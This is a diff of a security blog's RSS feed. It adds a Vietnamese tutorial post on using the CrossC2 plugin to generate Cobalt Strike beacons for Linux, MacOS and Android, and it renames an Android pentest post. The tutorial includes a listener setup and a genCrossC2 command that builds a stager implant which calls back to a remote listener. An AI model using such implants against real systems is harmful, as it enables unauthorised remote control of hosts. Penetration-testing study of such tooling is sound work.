@@ -6,8 +6,138 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Mon, 30 Aug 2021 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Wed, 03 Nov 2021 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://tranquac.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CrossC2 – Generate CobaltStrike’s Cross-Platform Payload</title>
+            <link>https://tranquac.github.io/posts/2021/11/crossc2-generate-cobaltstrikes-cross-platform-payload/</link>
+            <pubDate>Wed, 03 Nov 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://tranquac.github.io/posts/2021/11/crossc2-generate-cobaltstrikes-cross-platform-payload/</guid>
+            <description>Introduce Config  Listener Generate beacon  Gen via command Gen via install plugin     Result References  Introduce   &amp;ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&amp;rdquo;
+  Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&amp;hellip; theo mặc định.</description>
+            <content type="html"><![CDATA[<ul>
+<li><a href="#introduce">Introduce</a></li>
+<li><a href="#config">Config</a>
+<ul>
+<li><a href="#listener">Listener</a></li>
+<li><a href="#generate-beacon">Generate beacon</a>
+<ul>
+<li><a href="#gen-via-command">Gen via command</a></li>
+<li><a href="#gen-via-install-plugin">Gen via install plugin</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#result">Result</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="introduce">Introduce</h2>
+<ul>
+<li>
+<p>&ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;</p>
+</li>
+<li>
+<p>Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định.</p>
+</li>
+<li>
+<p>CrossC2 là một plugin mở rộng hỗ trợ Cobalt Strike điều khiển từ xa các máy chủ Linux, MacOS, Android&hellip;.Nó hỗ trợ các thư viện động do người dùng chỉ định, tải, thực thi các thư viện này.</p>
+</li>
+<li>
+<p>Bạn có thể xem chi tiết về dự án tại đây: <a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p>
+</li>
+</ul>
+<h2 id="config">Config</h2>
+<h3 id="listener">Listener</h3>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tạo một listener để lắng nghe kết nối từ xa</p>
+</li>
+<li>
+<p>Cobalt Strike -&gt; Listener</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG"></p>
+</li>
+<li>
+<p>Một điều đáng chú ý ở đây là CrossC2 hiện tại chỉ hỗ trợ Beacon Https. Vậy ta sẽ tạo Beacon HTTPS. Đối với các Beacon khác như HTTP sẽ không thể nhận kết nối.</p>
+</li>
+</ul>
+<h3 id="generate-beacon">Generate beacon</h3>
+<ul>
+<li>Ở đây sẽ có 2 phương phương pháp. Chúng ta có thể gen trực tiếp từ binaries mà tác giả đã compile bằng command hoặc install vào Cobalt Strike như một plugin phụ trợ để gen theo dạng Gui. Mình sẽ làm theo cả 2 cách:</li>
+</ul>
+<h4 id="gen-via-command">Gen via command</h4>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tải binary về tại đây: <a href="https://github.com/gloxec/CrossC2/releases">https://github.com/gloxec/CrossC2/releases</a></p>
+</li>
+<li>
+<p>Cách sử dụng tác giả cũng đã nói rất chi tiết:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG"></p>
+</li>
+<li>
+<p>Vì phiên bản Cobalt Strike đang sử dụng là 4.4 nên để gen payload tôi sử dụng lệnh sau:</p>
+</li>
+<li>
+<p><code>./genCrossC2.Linux IP_Listener 4444 .cobaltstrike.beacon_keys null Linux x64 ./beacon_linux_test stager 4.4</code></p>
+</li>
+<li>
+<p>cobaltstrike.beacon_keys: được tạo trong cùng thư mục root của Cobalt Strike server khi tạo Listener từ đầu</p>
+</li>
+<li>
+<p>Sau khi chạy lệnh thành công tôi nhận được beacon mới trong thư mục hiện tại:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG"></p>
+</li>
+</ul>
+<h4 id="gen-via-install-plugin">Gen via install plugin</h4>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tải về:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG"></p>
+</li>
+<li>
+<p>Và đừng quên tải xuống: <a href="https://github.com/gloxec/CrossC2/blob/cs4.1/CrossC2Kit/CrossC2Kit_Loader.cna">https://github.com/gloxec/CrossC2/blob/cs4.1/CrossC2Kit/CrossC2Kit_Loader.cna</a> (including memory loading and other functions)</p>
+</li>
+<li>
+<p>Trong CrossC2.cna chúng ta sẽ chỉnh sửa lại path đến binary gen payload và cobaltstrike.beacon_keys cho phù hợp:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG"></p>
+</li>
+<li>
+<p>Sau đó chúng ta sẽ tải plugin vào Cobalt Strike: Cobalt Strike -&gt; Script Manager -&gt; Load. Sau khi load xong chúng ta sẽ có thêm chức năng CrossC2 trên thanh Menu. Lúc này ta có thể sử dụng để gen payload:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG"></p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG"></p>
+</li>
+</ul>
+<h2 id="result">Result</h2>
+<ul>
+<li>
+<p>Sau khi download và thực thi payload tạo dựa trên command hay GUI trên máy chủ Linux:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG"></p>
+</li>
+<li>
+<p>Chúng ta có thể làm tương tự để nhận kết nối tự MacOS, Android&hellip;</p>
+</li>
+</ul>
+<h2 id="references">References</h2>
+<p>-<a href="https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html">https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>My Notes on Code-Review</title>
@@ -781,11 +911,11 @@ encoded_jwt <span style="color:#f92672">=</span> jwt<span style="color:#f92672">
         </item>
         
         <item>
-            <title>Androi pentest part 1</title>
-            <link>https://tranquac.github.io/posts/2021/07/androi-pentest-part-1/</link>
+            <title>Androi Pentest Note</title>
+            <link>https://tranquac.github.io/posts/2021/07/androi-pentest-note/</link>
             <pubDate>Wed, 21 Jul 2021 00:00:00 +0000</pubDate>
             
-            <guid>https://tranquac.github.io/posts/2021/07/androi-pentest-part-1/</guid>
+            <guid>https://tranquac.github.io/posts/2021/07/androi-pentest-note/</guid>
             <description>Concept Decompile and compile Using Adb and Frida interact Android  Concept Structure  AndroidManifest file contains the application’s structure Res folder contains all the resources that the application needs to run , including user interface layout, icons, audio, etc. The most interesting files for us are the classes.dex files because they are the compiled java files. The .dex extension stands for Dalvik EXecutable. So we need to decompile these dex files to get the java classes.</description>
             <content type="html"><![CDATA[<ul>
 <li><a href="#concept">Concept</a></li>
